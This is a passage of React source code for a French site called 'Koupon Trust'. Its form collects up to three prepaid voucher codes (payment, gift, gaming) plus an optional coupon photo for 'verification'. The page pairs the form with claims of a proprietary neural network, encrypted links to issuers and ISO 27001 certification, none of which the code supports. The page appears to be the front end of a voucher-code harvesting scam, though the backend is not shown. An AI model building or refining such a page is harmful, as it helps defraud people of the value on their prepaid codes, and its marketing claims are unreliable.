                                  <SelectContent side="bottom" className="bg-white border-slate-100 text-slate-900 shadow-xl">{AMOUNTS.map((a) => <SelectItem key={a} value={a} className="cursor-pointer">{a} €</SelectItem>)}</SelectContent>
                                </Select>
                                <FormMessage />
                              </FormItem>
                            )} />
                          </div>

                          <FormField control={form.control} name="couponCode" render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-slate-700 text-sm font-semibold">Code 1 du Coupon <span className="text-red-500">*</span></FormLabel>
                              <div className="relative">
                                <FormControl>
                                  <Input 
                                    type={showCode ? "text" : "password"} 
                                    placeholder="Entrez le code de votre coupon" 
                                    {...field} 
                                    className="bg-white border-slate-200 text-slate-900 placeholder:text-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/10 h-11 rounded-xl transition-all font-mono tracking-widest"
                                    data-testid="input-coupon-code"
                                  />
                                </FormControl>
                              </div>
                              <FormMessage />
                            </FormItem>
                          )} />

                          <FormField control={form.control} name="couponCode2" render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-slate-700 text-sm font-semibold">Code 2 du Coupon (optionnel)</FormLabel>
                              <FormControl>
                                <Input 
                                  type={showCode ? "text" : "password"} 
                                  placeholder="Deuxième code (optionnel)" 
                                  {...field} 
                                  className="bg-white border-slate-200 text-slate-900 placeholder:text-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/10 h-11 rounded-xl transition-all font-mono tracking-widest"
                                  data-testid="input-coupon-code-2"
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )} />

                          <FormField control={form.control} name="couponCode3" render={({ field }) => (
                            <FormItem>
                              <FormLabel className="text-slate-700 text-sm font-semibold">Code 3 du Coupon (optionnel)</FormLabel>
                              <FormControl>
                                <Input 
                                  type={showCode ? "text" : "password"} 
                                  placeholder="Troisième code (optionnel)" 
                                  {...field} 
                                  className="bg-white border-slate-200 text-slate-900 placeholder:text-slate-400 focus:border-blue-500 focus:ring-2 focus:ring-blue-500/10 h-11 rounded-xl transition-all font-mono tracking-widest"
                                  data-testid="input-coupon-code-3"
                                />
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )} />

                          <Button 
                            type="button" 
                            onClick={() => setShowCode(!showCode)} 
                            variant="outline"
                            className="w-full mt-3 h-10 text-sm font-semibold text-slate-900 border-slate-300 hover:bg-slate-50 rounded-lg transition-all"
                            data-testid="button-toggle-code"
                          >
                            {showCode ? (
                              <>
                                <EyeOff size={16} className="mr-2" />
                                Cacher les codes
                              </>
                            ) : (
                              <>
                                <Eye size={16} className="mr-2" />
                                Afficher les codes
                              </>
                            )}
                          </Button>

                          <FormField control={form.control} name="couponImage" render={({ field: { value, onChange, ...fieldProps } }) => (
                            <FormItem>
                              <FormControl>
                                {!selectedFile ? (
                                  <div className="relative group">
                                    <Input {...fieldProps} type="file" accept="image/*" className="hidden" id="file-upload" onChange={(e) => handleFileChange(e, onChange)} />
                                    <label htmlFor="file-upload" className="flex flex-col items-center justify-center w-full h-28 border border-dashed border-slate-300 rounded-xl cursor-pointer bg-slate-50 hover:bg-white hover:border-blue-500 hover:shadow-md transition-all">
                                      <div className="flex flex-col items-center pt-4 pb-4">
                                        <div className="p-2 bg-blue-50 rounded-full border border-blue-100 mb-2 group-hover:scale-110 transition-transform"><Upload className="w-4 h-4 text-blue-600" /></div>
                                        <p className="text-xs text-slate-600 font-medium">Photo du coupon (optionnelle)</p>
                                      </div>
                                    </label>
                                  </div>
                                ) : (
                                  <div className="flex items-center gap-3 p-3 bg-white border border-slate-200 rounded-xl shadow-sm">
                                    <div className="h-10 w-10 rounded-lg overflow-hidden bg-slate-100 flex-shrink-0 border border-slate-100">{previewUrl ? <img src={previewUrl} className="h-full w-full object-cover" /> : <ImageIcon className="h-5 w-5 m-auto mt-2.5 text-slate-400" />}</div>
                                    <div className="flex-1 min-w-0"><p className="text-sm font-medium text-slate-900 truncate">{selectedFile.name}</p></div>
                                    <button type="button" onClick={removeFile} className="p-1.5 hover:bg-slate-100 rounded-full text-slate-400 hover:text-red-500 transition-colors"><X className="w-4 h-4" /></button>
                                  </div>
                                )}
                              </FormControl>
                              <FormMessage />
                            </FormItem>
                          )} />

                          <Button type="submit" className="w-full h-12 text-base font-bold shadow-lg shadow-blue-600/20 hover:shadow-xl hover:shadow-blue-600/30 transition-all bg-gradient-to-r from-blue-600 to-purple-600 hover:scale-[1.02] text-white rounded-xl mt-2">
                            Vérifier maintenant <ChevronRight className="ml-2 w-4 h-4" />
                          </Button>
                        </form>
                      </Form>
                    )}
                    {isAnalyzing && (
                      <div className="py-16 flex flex-col items-center justify-center text-center space-y-6">
                        <div className="relative">
                          <div className="absolute inset-0 bg-blue-500/20 rounded-full blur-2xl animate-pulse"></div>
                          <div className="relative bg-white p-5 rounded-full border border-blue-100 shadow-lg"><Loader2 className="h-10 w-10 text-blue-600 animate-spin" /></div>
                        </div>
                        <div className="space-y-2"><h3 className="text-xl font-bold text-slate-900">Analyse en cours...</h3><p className="text-slate-500 text-sm">Validation cryptographique sécurisée.</p></div>
                      </div>
                    )}
                    {result === "success" && (
                      <div className="py-12 flex flex-col items-center justify-center text-center space-y-6">
                        <div className="bg-blue-50 p-5 rounded-full text-blue-600 border border-blue-100 shadow-lg"><CheckCircle2 className="h-12 w-12" /></div>
                        <div className="space-y-2">
                          <h3 className="text-2xl font-bold text-slate-900">Demande Envoyée</h3>
                          <p className="text-slate-500 max-w-sm">Votre demande de vérification est en cours de traitement. Vous recevrez un email avec le résultat sous peu.</p>
                        </div>
                        {user && (
                          <Button variant="outline" className="border-blue-200 hover:bg-blue-50 text-blue-700" onClick={() => setLocation("/dashboard")}>
                            Voir mon espace
                          </Button>
                        )}
                        <Button variant="ghost" className="text-slate-500" onClick={() => { setResult(null); form.reset(); removeFile(); }}>Nouvelle vérification</Button>
                      </div>
                    )}
                    {result === "error" && (
                      <div className="py-12 flex flex-col items-center justify-center text-center space-y-6">
                        <div className="bg-red-50 p-5 rounded-full text-red-600 border border-red-100 shadow-lg"><X className="h-12 w-12" /></div>
                        <div className="space-y-2">
                          <h3 className="text-2xl font-bold text-slate-900">Erreur</h3>
                          <p className="text-slate-500">Une erreur est survenue lors de la soumission. Veuillez réessayer.</p>
                        </div>
                        <Button variant="outline" className="mt-4 border-slate-200 hover:bg-slate-50 text-slate-700" onClick={() => { setResult(null); }}>Réessayer</Button>
                      </div>
                    )}
                  </CardContent>
                </Card>
              </div>
            </motion.div>
          </div>
        </section>

        {/* 3. Comment ça marche */}
        <section id="comment-ca-marche" className="py-12 sm:py-24 relative bg-white border-y border-slate-100">
          <div className="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8">
            <div className="text-center mb-8 sm:mb-16">
              <h2 className="text-2xl sm:text-3xl md:text-4xl font-display font-bold text-slate-900 mb-3 sm:mb-4">Processus de Validation</h2>
              <p className="text-sm sm:text-base text-slate-500 max-w-2xl mx-auto px-2">Une technologie complexe rendue simple pour l'utilisateur. 3 étapes sécurisées.</p>
            </div>
            <div className="grid sm:grid-cols-2 md:grid-cols-3 gap-4 sm:gap-8">
              {STEPS.map((step, i) => (
                <div key={i} className="relative p-8 rounded-3xl bg-slate-50 border border-slate-100 hover:shadow-lg transition-all group">
                  <div className="relative">
                    <div className="w-14 h-14 rounded-2xl bg-white border border-slate-100 flex items-center justify-center mb-6 shadow-sm group-hover:scale-110 transition-transform">
                      <step.icon className="w-7 h-7 text-blue-600" />
                    </div>
                    <h3 className="text-xl font-bold text-slate-900 mb-3">{step.title}</h3>
                    <p className="text-slate-500 leading-relaxed">{step.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* 4. Technologie */}
        <section id="securite" className="py-12 sm:py-24 relative bg-slate-50">
          <div className="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8">
            <div className="flex flex-col lg:flex-row items-center gap-8 sm:gap-16">
              <div className="flex-1 space-y-4 sm:space-y-8">
                <h2 className="text-2xl sm:text-3xl md:text-4xl font-display font-bold text-slate-900">Infrastructure Intelligence</h2>
                <p className="text-slate-600 text-sm sm:text-lg leading-relaxed">
                  Notre cœur technologique repose sur un réseau neuronal propriétaire capable de détecter les fraudes et de valider les codes en millisecondes. Nous croisons les données avec les serveurs émetteurs via des tunnels chiffrés.
                </p>
                <div className="grid grid-cols-2 gap-4">
                  {TECH_STACK.map((tech, i) => (
                    <div key={i} className="flex items-center gap-3 p-3 rounded-xl bg-white border border-slate-200 shadow-sm">
                      <tech.icon className="w-5 h-5 text-blue-600" />
                      <span className="text-sm font-medium text-slate-700">{tech.label}</span>
                    </div>
                  ))}
                </div>
              </div>
              <div className="flex-1">
                <NovaAIEngineHome />
              </div>
            </div>
          </div>
        </section>

        {/* 5. Émetteurs Compatibles */}
        <section id="emetteurs" className="py-12 sm:py-24 bg-white border-y border-slate-100">
          <div className="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8">
            <div className="text-center mb-8 sm:mb-12">
              <h2 className="text-2xl sm:text-3xl md:text-4xl font-display font-bold text-slate-900 mb-4">Écosystème Compatible</h2>
              <div className="flex flex-wrap justify-center gap-2 sm:gap-4 mt-6 sm:mt-8">
                {["all", "payment", "gift", "gaming", "entertainment"].map((cat) => (
                  <button
                    key={cat}
                    onClick={() => setActiveTab(cat)}
                    className={`px-3 sm:px-4 py-1.5 sm:py-2 rounded-full text-xs sm:text-sm font-medium transition-all ${activeTab === cat ? "bg-slate-900 text-white shadow-lg" : "bg-slate-100 text-slate-600 hover:bg-slate-200"}`}
                  >
                    {cat.charAt(0).toUpperCase() + cat.slice(1)}
                  </button>
                ))}
              </div>
            </div>
            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3 sm:gap-4">
              {filteredCoupons.map((coupon) => (
                <div key={coupon.id} className="group p-4 rounded-2xl bg-slate-50 border border-slate-100 hover:border-blue-200 hover:bg-white hover:shadow-lg transition-all cursor-pointer text-center" data-testid={`card-coupon-${coupon.id}`}>
                   <div className="w-16 h-16 mx-auto mb-3 bg-white rounded-xl p-2 flex items-center justify-center shadow-sm border border-slate-100">
                     <img 
                       src={coupon.logoUrl} 
                       alt={coupon.name}
                       className="w-full h-full object-contain" 
                       onError={(e) => {
                         e.currentTarget.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="60" height="60"><text x="50%" y="50%" text-anchor="middle" dy=".3em" fill="%23333" font-size="10" font-weight="bold">' + coupon.name + '</text></svg>';
                       }}
                     />
                   </div>
                   <p className="text-xs font-medium text-slate-600 group-hover:text-blue-600">{coupon.name}</p>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* 6. FAQ */}
        <section id="faq" className="py-12 sm:py-24 bg-slate-50">
          <div className="max-w-3xl mx-auto px-3 sm:px-6 lg:px-8">
            <h2 className="text-2xl sm:text-3xl font-display font-bold text-slate-900 mb-8 sm:mb-12 text-center">Questions Fréquentes</h2>
            <Accordion type="single" collapsible className="space-y-4">
              {FAQ_ITEMS.map((item, i) => (
                <AccordionItem key={i} value={`item-${i}`} className="border border-slate-200 rounded-2xl bg-white px-6 shadow-sm">
                  <AccordionTrigger className="text-slate-900 hover:text-blue-600 hover:no-underline py-4 font-medium">{item.question}</AccordionTrigger>
                  <AccordionContent className="text-slate-500 pb-4">{item.answer}</AccordionContent>
                </AccordionItem>
              ))}
            </Accordion>
          </div>
        </section>

        {/* 7. Footer */}
        <footer className="py-10 sm:py-16 border-t border-slate-200 bg-white">
          <div className="max-w-7xl mx-auto px-3 sm:px-6 lg:px-8">
            <div className="grid grid-cols-2 md:grid-cols-4 gap-6 sm:gap-12 mb-8 sm:mb-12">
              <div className="col-span-1 md:col-span-2">
                <div className="flex items-center gap-3 mb-6">
                  <img src={kouponLogo} alt="Koupon Trust" className="h-10 w-10 object-contain" />
                  <span className="font-bold text-2xl bg-gradient-to-r from-slate-900 via-blue-900 to-slate-900 bg-clip-text text-transparent">Koupon Trust</span>
                </div>
                <p className="text-slate-500 text-sm leading-relaxed max-w-sm">
                  La référence mondiale pour la vérification sécurisée de titres prépayés. Technologie certifiée ISO 27001.
                </p>
              </div>
              <div>
                <h4 className="font-bold text-slate-900 mb-6">Liens Rapides</h4>
                <ul className="space-y-4 text-sm text-slate-500">
                  <li><a href="#" onClick={() => window.scrollTo(0, 0)} className="hover:text-blue-600 transition-colors cursor-pointer" data-testid="link-verify-coupon">Vérifier un coupon</a></li>
                  <li><a href="#emetteurs" className="hover:text-blue-600 transition-colors" data-testid="link-supported-brands">Marques supportées</a></li>
                  <li><a href="#faq" className="hover:text-blue-600 transition-colors" data-testid="link-faq">Questions fréquentes</a></li>
                </ul>
              </div>
              <div>
                <h4 className="font-bold text-slate-900 mb-6">Légal</h4>
                <ul className="space-y-4 text-sm text-slate-500">
                  <li><a href="/terms" className="hover:text-blue-600 transition-colors" data-testid="link-terms">Conditions d'utilisation</a></li>
                  <li><a href="/privacy" className="hover:text-blue-600 transition-colors" data-testid="link-privacy">Politique de confidentialité</a></li>
                  <li><a href="/cookies" className="hover:text-blue-600 transition-colors" data-testid="link-cookies">Cookies</a></li>
                </ul>
              </div>
            </div>
            <div className="pt-8 border-t border-slate-100 flex flex-col md:flex-row justify-between items-center gap-4">
              <p className="text-xs text-slate-400">© 2026 Koupon Trust Inc. Tous droits réservés.</p>
              <div className="flex gap-4">
                 {/* Email Contact */}
                 <a href="mailto:support@koupontrust.com" className="w-8 h-8 rounded-full bg-slate-100 flex items-center justify-center hover:bg-blue-50 transition-colors" data-testid="link-contact-email" title="Envoyer un email">
                   <Mail className="w-4 h-4 text-slate-500 hover:text-blue-600" />
                 </a>
              </div>
            </div>
          </div>
        </footer>

      </main>
      <AuthModal open={authModalOpen} onOpenChange={setAuthModalOpen} />
    </div>
  );
}
